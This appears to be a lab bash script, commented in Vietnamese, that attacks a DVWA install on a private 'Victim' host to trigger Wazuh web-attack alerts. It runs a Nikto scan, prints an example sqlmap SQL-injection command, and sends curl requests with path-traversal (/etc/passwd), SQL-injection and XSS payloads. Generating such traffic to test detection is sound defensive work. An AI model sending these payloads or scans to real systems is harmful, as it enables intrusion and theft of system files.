#!/usr/bin/env bash
# Web scan/attack vào DVWA trên Victim — kích rule Wazuh 31xxx (web attack).
# Yêu cầu: DVWA đã cài trên Victim (.20), Apache chạy.
# Chạy từ Kali: bash web-attack.sh <VICTIM_IP>
set -euo pipefail

TARGET="${1:-192.168.100.20}"

echo "=== 1. Nikto scan ==="
command -v nikto >/dev/null && nikto -h "http://$TARGET" -maxtime 60s || echo "!! nikto chưa cài"

echo ""
echo "=== 2. SQLMap (DVWA) ==="
echo "[*] Cần cookie DVWA. Nếu chưa login, bỏ qua bước này."
echo "[*] Ví dụ manual:"
echo "    sqlmap -u 'http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=xxx;security=low' --batch --level=2"

echo ""
echo "=== 3. Curl đơn giản (trigger WAF rule) ==="
curl -s -o /dev/null -w "HTTP %{http_code}" "http://$TARGET/../../etc/passwd" || true
echo ""
curl -s -o /dev/null -w "HTTP %{http_code}" "http://$TARGET/?id=1' OR 1=1--" || true
echo ""
curl -s -o /dev/null -w "HTTP %{http_code}" "http://$TARGET/<script>alert(1)</script>" || true

echo ""
echo "[✓] Xong. Kiểm tra alert web trên Wazuh Dashboard."
